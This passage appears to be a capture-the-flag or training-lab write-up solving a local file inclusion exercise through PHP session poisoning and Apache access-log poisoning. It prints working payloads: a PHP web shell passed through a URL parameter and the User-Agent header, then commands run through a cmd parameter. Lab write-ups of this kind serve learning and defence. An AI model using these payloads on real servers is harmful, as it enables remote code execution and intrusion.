...
-A specifies the user agent. We could also use --user-agent.
...
For this one I wanted to try PHP Session poisoning.

I saw my sessionId was: `e0fok4b7lho9snht5vtkv17bvb`

So I tried to include `/var/lib/php/sessions/sess_e0fok4b7lho9snht5vtkv17bvb`

And it worked. 

So lets visit:
``` url
http://94.237.55.12:51984/index.php?language=session_poisoning
```

Then re-include the file and low behold it worked.

So then I can just do:
``` url
http://94.237.55.12:51984/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

Then reinclude the file, with this:
`/var/lib/php/sessions/sess_e0fok4b7lho9snht5vtkv17bvb&cmd=pwd`

The answer is /var/www/html

Try to use a different technique to gain RCE and read the flag at / 

For the second question I wanted to us User-Agent poisioning.

So first lets, include `/var/log/apache2/access.log`

And it works.

So lets try sending "Log Poisoning".

`curl "http://94.237.55.12:51984/index.php?language=/var/log/apache2/access.log" -A "Log Poisoning"`

And when we re-include we see that it worked. So we can just do:
`curl -s "http://94.237.55.12:51984/index.php?language=/var/log/apache2/access.log" -A '<?php system($_GET['cmd']); ?>'`

Then I can run:
``` url
http://94.237.55.12:51984/index.php?language=/var/log/apache2/access.log&cmd=ls+/
```

And that gives me the name of the file. From there its very easy to get the flag.
